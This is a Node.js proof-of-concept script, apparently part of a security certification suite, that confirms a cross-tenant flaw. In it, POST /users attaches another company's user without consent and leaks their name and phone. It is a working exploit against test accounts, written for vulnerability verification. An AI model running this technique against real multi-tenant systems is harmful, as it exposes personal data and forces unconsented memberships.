'use strict';
/**
 * L38 — POST /users adds an existing identity of ANOTHER company without
 * consent and returns that identity's profile (name, phone, lastLogin).
 *
 * Attack: a PM/company-admin of workspace A (024) posts a user whose e-mail
 * belongs to an identity that lives in workspace B (025). The server does not
 * refuse; it attaches that identity to A with an ACTIVE membership and returns
 * the real profile with existingIdentity:true. The person never consented.
 *
 * We prove it on a throwaway identity created in 025 so no persona is touched.
 */
const { as, raw } = require('../lib/api');
const { createByInvitation } = require('../lib/invitations');

const PASSWORD = process.env.CERT_PASSWORD; // read, never printed
const stamp = Date.now();
const victimEmail = `l38.victim.${stamp}@c025.octapm-cert.test`;
const victimName = 'Victim Real Name L38';
const victimPhone = '+1-555-0138';

const show = (label, res) => {
  const body = res.body ?? res;
  console.log(`\n${label}`);
  console.log('  status:', res.status ?? '(call)');
  console.log('  body  :', JSON.stringify(body));
};

(async () => {
  const pm25 = as('pm@c025.octapm-cert.test');
  const pm24 = as('pm@c024.octapm-cert.test');
  const org24 = (await pm24.GET('/auth/me')).active.orgId;
  const org25 = (await pm25.GET('/auth/me')).active.orgId;
  console.log('workspace A (attacker) 024 =', org24);
  console.log('workspace B (victim)   025 =', org25);

  // 1. Create the victim identity in 025 (home = 025), with a real profile: since D-ID-1 the one way
  //    is an invitation from 025 that the new e-mail accepts with its own name, phone and password.
  const created = await createByInvitation({ inviter: pm25, email: victimEmail, role: 'qs', name: victimName, phone: victimPhone, password: PASSWORD });
  if (!created.userId) throw new Error(`setup: the victim was not created in 025 (invite ${created.invited?.status} / accept ${created.accepted?.status})`);
  console.log('\n[setup] victim created in 025, id =', created.userId, 'name =', victimName);

  // Log the victim in once so lastLogin is a real value worth leaking.
  await as(victimEmail).GET('/auth/me');
  console.log('[setup] victim has signed in once (lastLogin now set)');

  // 2. As PM of 024, add the SAME e-mail. We pass a DIFFERENT name on purpose
  //    to show the response does NOT reflect our input — it leaks 025's data.
  const add = await pm24.send('POST', '/users', {
    name: 'Totally Different Name', email: victimEmail, role: 'site_engineer',
  });
  show('[attack] POST /users (024) with 025 identity e-mail', add);

  const leaked = add.body?.data || {};
  const profileLeak =
    add.status === 201 &&
    leaked.existingIdentity === true &&
    leaked.name === victimName &&      // 025's real name, not our input
    leaked.phone === victimPhone;      // 025's real phone

  // 3. The victim is now an ACTIVE member of 024 without consent.
  let listedInA = false;
  try {
    const list = await pm24.GET(`/users?search=${encodeURIComponent(victimEmail)}`);
    const row = (list.items || []).find((u) => u.email === victimEmail);
    listedInA = Boolean(row && row.status === 'active');
    console.log('\n[attack] GET /users (024) now lists the victim:', JSON.stringify(row));
  } catch (e) { console.log('list error', e.message); }

  // 4. From the victim's side: 024 now appears in their workspace picker.
  const login = await raw('POST', '/auth/login', { json: { email: victimEmail, password: PASSWORD } });
  const orgs = (login.body?.data?.memberships || []).map((m) => m.orgId);
  const victimSeesA = orgs.includes(org24);
  console.log('\n[attack] victim login memberships now include 024:', victimSeesA, JSON.stringify(orgs));

  const confirmed = profileLeak && listedInA && victimSeesA;
  console.log('\n--- assessment ---');
  console.log('  profile leaked (name+phone of 025 identity):', profileLeak);
  console.log('  forced ACTIVE membership in 024           :', listedInA);
  console.log('  victim now sees workspace 024             :', victimSeesA);

  if (confirmed) {
    process.exitCode = 2;
    console.log('\nVERDICT L38: CONFIRMED — POST /users in workspace 024 attached an existing 025 identity as an active member with no consent and returned its real name/phone/lastLogin (cross-tenant PII leak + email oracle + forced membership).');
  } else {
    process.exitCode = 0;
    console.log('\nVERDICT L38: NOT_REPRODUCED — the cross-company add did not leak the profile or create an active membership.');
  }
})().catch((e) => { console.error('ERROR', e.stack || e.message); process.exitCode = 1; });
